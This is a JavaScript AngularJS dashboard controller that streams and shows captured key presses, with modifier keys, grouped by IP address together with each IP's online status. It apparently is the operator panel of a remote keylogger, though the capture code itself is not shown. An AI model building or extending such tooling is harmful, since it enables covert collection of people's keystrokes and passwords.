(function (angular) {
    "use strict";

    var app = angular.module('main', ['luegg.directives'])

    .controller('DashboardController', ['$scope', function($scope) {
        $scope.step = 0;
        $scope.counter = 0;

        io.socket.get('/key',function(data){
            if(data){
                for(var i=0;i<data.length;i++){
                    data[i].step = i;
                }
                $scope.step = 0
                $scope.ips = data;
                $scope.$apply();
            }
        });

        io.socket.on('key',function(obj){
            if(obj.verb == 'updated'){
                for(var i=0;i<$scope.ips.length;i++){
                    var ip = $scope.ips[i];
                    if(ip.id == obj.id){
                        ip.keys = obj.data.keys;
                        $scope.$apply();
                        return;
                    }
                }
            }else if(obj.verb == 'created'){
                obj.data.step = $scope.ips.length;
                $scope.ips.push(obj.data);
                $scope.$apply();
            }

        });


        $scope.online = {};
        io.socket.get('/user',function(data){
            var online = {};
            for(var i=0;i<data.length;i++){
                online[data[i].ip] = data[i].online;
            }
            $scope.online = online;
            $scope.$apply();
        });

        io.socket.on('user',function(obj){
            if(obj){
                $scope.online[obj.data.ip] = obj.data.online;
            }
            $scope.$apply();
        });

    	$scope.time = function(tUnix){
    		var t = moment.unix(tUnix);
    		return t.fromNow();
    	}

        $scope.keyMod = function (data) {
            var res = '';

            for (var mod in data.modifiers) {
                res += data.modifiers[mod] ? '['+mod+']' + ' ' : '';
            }

            res += data.key || '';
            //$scope.counter += res ? 1 : 0;

            return res;
        }
    }])
})(window.angular);
